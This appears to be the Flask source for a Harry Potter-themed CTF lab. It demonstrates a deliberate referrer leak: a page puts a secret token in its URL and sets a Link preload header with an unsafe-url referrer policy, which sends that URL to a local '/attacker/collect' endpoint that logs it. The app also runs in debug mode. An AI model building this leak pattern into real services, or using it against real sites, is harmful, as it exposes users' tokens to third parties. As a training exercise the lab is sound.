from flask import Flask, request, render_template, Response

app = Flask(__name__)
leaks = []

@app.route("/")
def home():
    return '''
    <h2>🪞 Welcome to The Mirror of Erised CTF</h2>
    <p><a href="/hogwarts/mirror?stone=1broom2wand3key">🧙 Visit Hogwarts Archive</a></p>
    <p><a href="/attacker">🧌 Launch the Attacker Page</a></p>
    <p><a href="/attacker/leaks">🕵️ View Leaked Referrers</a></p>
    '''

@app.route("/hogwarts/mirror")
def mirror():
    token = "1broom2wand3key"
    content = render_template("mirror.html", token=token)
    response = Response(content)
    response.headers["Link"] = '<http://localhost:5000/attacker/collect>; rel=preload; as=image; referrer-policy=unsafe-url'
    return response

@app.route("/attacker")
def attacker():
    return render_template("attacker.html")

@app.route("/attacker/collect")
def collect():
    ref = request.headers.get("Referer", "No Referer Sent")
    leaks.append(ref)
    return "📥 Referrer Collected"

@app.route("/attacker/leaks")
def show_leaks():
    return render_template("leaks.html", leaks=leaks)

if __name__ == "__main__":
    app.run(debug=True)
